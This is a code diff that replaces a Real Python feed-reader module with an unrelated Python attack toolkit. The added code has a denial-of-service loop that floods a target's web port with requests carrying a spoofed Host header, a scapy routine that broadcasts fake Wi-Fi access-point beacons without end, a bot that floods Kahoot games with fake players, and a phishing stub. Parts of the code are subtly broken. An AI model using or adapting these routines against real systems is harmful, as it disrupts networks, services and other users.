@@ -1,55 +1,107 @@
-"""Interact with the Real Python feed."""
-# Standard library imports
-from typing import Dict, List  # noqa
+from twilio.rest import Client
+import socket,time,smtplib,ssl,random,poplib,os,hashlib,string
+from email.message import EmailMessage
+from datetime import datetime
+from webbot import Browser
+from scapy.all import *
 
-# Third party imports
-import feedparser
-import html2text
-
-# Reader imports
-from reader import URL
-
-_CACHED_FEEDS: Dict[str, feedparser.FeedParserDict] = {}
-
-
-def _feed(url: str = URL) -> feedparser.FeedParserDict:
-    """Cache contents of the feed, so it's only read once."""
-    if url not in _CACHED_FEEDS:
-        _CACHED_FEEDS[url] = feedparser.parse(url)
-    return _CACHED_FEEDS[url]
-
-
-def get_site(url: str = URL) -> str:
-    """Get name and link to website of the feed."""
-    info = _feed(url).feed
-    return f"{info.title} ({info.link})"
-
-
-def get_article(article_id: str, links: bool = False, url: str = URL) -> str:
-    """Get article from feed with the given ID."""
-    articles = _feed(url).entries
+def CheckValue(type_word):
     try:
-        article = articles[int(article_id)]
-    except (IndexError, ValueError):
-        max_id = len(articles) - 1
-        msg = f"Unknown article ID, use ID from 0 to {max_id}"
-        raise SystemExit(f"Error: {msg}")
-
-    # Get article as HTML
-    try:
-        html = article.content[0].value
-    except AttributeError:
-        html = article.summary
-
-    # Convert HTML to plain text
-    to_text = html2text.HTML2Text()
-    to_text.ignore_links = not links
-    text = to_text.handle(html)
-
-    return f"# {article.title}\n\n{text}"
+        int(type_word)
+        return True
+    except:
+        return False
 
 
-def get_titles(url: str = URL) -> List[str]:
-    """List titles in feed."""
-    articles = _feed(url).entries
-    return [a.title for a in articles]
+
+def DDOS(ip,pip):
+  target = ip
+  fake_ip = pip
+  port = 80
+  while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+def Hotspot(name):
+  
+  try:
+    iface = "wlan0mon"
+    sender_mac = RandMAC()
+    ssid = name
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
+    beacon = Dot11Beacon()
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    frame = RadioTap()/dot11/beacon/essid
+    sendp(frame, inter=0.1, iface=iface, loop=1)
+  except:
+      print("Error: " + Exception)
+      
+def Phishing():
+  print("Under development")
+  
+def BotCreator(ItCode):
+  web = Browser()
+
+  tab = 1
+  add = 1
+  
+  
+  web.go_to('https://kahoot.it')
+  code = ItCode
+  
+  while True:
+  
+    text_areas = web.find_elements(xpath='//input')
+    web.type(web.Key.TAB,into=text_areas[0].text)
+    web.type(code)
+    web.type(web.Key.ENTER,into=text_areas[0].text)
+  
+  
+    text_areas2 = web.find_elements(xpath='//input')
+    web.type(web.Key.TAB,into=text_areas2[0].text)
+    web.type(code)
+    web.type(web.Key.ENTER,into=text_areas2[0].text)
+  
+  
+    time.sleep(2)
+  
+  
+    text_areas3 = web.find_elements(xpath='//input')
+    web.type(web.Key.TAB,into=text_areas3[0].text)
+    web.type(code)
+    web.type(web.Key.ENTER,into=text_areas3[0].text)
+  
+  
+    adj1 = input("Name:")
+    bot_username = random.choice(adj1) + "boi"
+  
+        
+    text_areas4 = web.find_elements(xpath='//input')
+    web.type(web.Key.TAB,into=text_areas4[0].text)
+    web.type(bot_username)
+    web.type(web.Key.ENTER,into=text_areas4[0].text)
+  
+  
+    web.execute_script("window.open(' kahoot.it');")
+    tab = tab + add
+    web.switch_to_tab(tab)
+  
+  
+
+        
+    
+
+
+
+
+        
+    
+
+
+
+
+
+
+        
